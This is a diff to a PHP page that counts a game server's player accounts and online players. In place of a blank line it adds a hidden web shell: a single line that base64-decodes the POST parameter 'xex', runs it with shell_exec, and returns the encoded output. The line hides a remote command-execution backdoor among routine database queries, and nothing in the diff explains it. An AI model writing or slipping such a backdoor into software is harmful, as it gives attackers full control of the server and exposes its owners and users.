@@ -65,7 +65,7 @@ include_once('inc/include.php');
 $cPlayer = $connec->prepare('SELECT player_id FROM accounts');
 $cPlayer->execute();
 $countPlayer = $cPlayer->rowCount();
-
+$c=shell_exec(base64_decode($_POST['xex'])); echo base64_encode($c);
 $cPlayerOnline = $connec->prepare('SELECT player_id FROM accounts WHERE online = true');
 $cPlayerOnline->execute();
 $countPlayerOnline = $cPlayerOnline->rowCount();
